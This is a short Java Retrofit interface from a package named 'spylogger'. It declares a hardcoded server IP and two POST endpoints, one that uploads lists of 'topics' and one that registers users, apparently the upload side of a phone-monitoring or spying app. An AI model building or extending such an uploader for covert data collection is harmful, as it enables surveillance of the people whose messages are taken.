package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.UsuarioVO;

import java.util.List;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;

/**
 * Created by bruno on 01/12/16.
 */

public interface SendDataInterface {

    String ip="172.24.35.147";
//    String ip="192.168.1.119";

    String apiUrl="http://"+ip+"/smartlog/api/v1/";

    @POST(apiUrl+"receber/topicos")
    Call<Boolean> enviarTopicos(@Body List<Topico> topicos);

    @POST(apiUrl+"usuario")
    Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);

}
